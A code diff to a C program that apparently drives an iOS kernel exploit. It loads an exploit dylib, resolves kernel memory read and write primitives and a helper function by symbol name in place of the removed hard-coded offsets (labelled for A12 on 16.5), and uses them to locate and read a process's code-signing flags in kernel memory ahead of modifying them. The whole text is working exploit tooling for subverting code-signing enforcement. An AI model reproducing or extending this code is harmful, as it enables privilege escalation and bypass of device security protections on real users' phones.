@@ -14,13 +14,6 @@
 #define DRIVER_CMD_TASK_GET_ROOT 26
 #define DRIVER_CMD_TASK_FOR_PID 0xc000001d
 
-// A12 16.5
-#define OFF_377bed_entry1_kwritebuf 0x2a714
-#define OFF_377bed_entry1_kreadbuf 0x2572C
-// kernel_exploit
-#define OFF_xxxxxx_entry1_kwritebuf 0x2b045
-#define OFF_xxxxxx_entry1_kreadbuf 0x2acd1
-
 //typedef struct {
 //    uint8_t __unk[7520];
 //} krw_ctx_t;
@@ -87,8 +80,9 @@ typedef struct module_vtable {
 } module_vtable_t;
 typedef int (*driver_fn_t)(module_vtable_t **);
 
-typedef int (*driver_kreadbuf)(void *ctx, uint64_t address, mach_vm_size_t size, uint64_t *valueOut);
+typedef int (*driver_kreadbuf)(void *ctx, uint64_t address, mach_vm_size_t size, void *valueOut);
 typedef int (*driver_kwritebuf)(void *ctx, uint64_t address, const void *value, mach_vm_size_t size);
+typedef uint64_t (*driver_task_csflags_kaddr)(krw_ctx_t *ctx, mach_port_t task_port);
 krw_ctx_t *global_ctx;
 driver_kreadbuf kread_buf_internal;
 driver_kwritebuf kwrite_buf_internal;
@@ -176,16 +170,18 @@ void kwrite64(uint64_t addr, uint64_t value) {
 int csops(int, int, void*, int);
 int main(int argc, char *argv[], char *envp[]) {
     
-    int index = _dyld_image_count();
     void *handle = //dlopen("@loader_path/kernel_exploit.dylib", RTLD_GLOBAL);
     dlopen("@loader_path/entry1_type0x09.dylib", RTLD_GLOBAL);
     if(!handle) {
         fprintf(stderr, "dlopen failed: %s\n", dlerror());
         return 1;
     }
-    const struct mach_header_64 *header = (const struct mach_header_64 *)_dyld_get_image_header(index);
-    kread_buf_internal  = (void*)((uintptr_t)header + OFF_377bed_entry1_kreadbuf);
-    kwrite_buf_internal = (void*)((uintptr_t)header + OFF_377bed_entry1_kwritebuf);
+    kread_buf_internal = (driver_kreadbuf)dlsym(handle, "kreadbuf_last_1");
+    kwrite_buf_internal = (driver_kwritebuf)dlsym(handle, "kwritebuf_last_1");
+    if (!kread_buf_internal || !kwrite_buf_internal) {
+        fprintf(stderr, "dlsym rw failed: %s\n", dlerror());
+        return 1;
+    }
     
     driver_fn_t driver_fn = (driver_fn_t)dlsym(handle, "driver");
     if (!driver_fn) {
@@ -228,7 +224,11 @@ int main(int argc, char *argv[], char *envp[]) {
     csops(pid, 0, &flags, sizeof(flags));
     printf("csops before modify: 0x%x\n", flags);
     
-    uint64_t (*task_csflags_kaddr)(krw_ctx_t *, mach_port_t) = (void*)((uintptr_t)header + 0x34680);
+    driver_task_csflags_kaddr task_csflags_kaddr = (driver_task_csflags_kaddr)dlsym(handle, "sub_34680");
+    if (!task_csflags_kaddr) {
+        fprintf(stderr, "dlsym task_csflags_kaddr failed: %s\n", dlerror());
+        return 1;
+    }
     uint64_t addr = task_csflags_kaddr(global_ctx, args.port);
     flags = kread32(addr);
     printf("csops read from krw: 0x%x\n", flags);
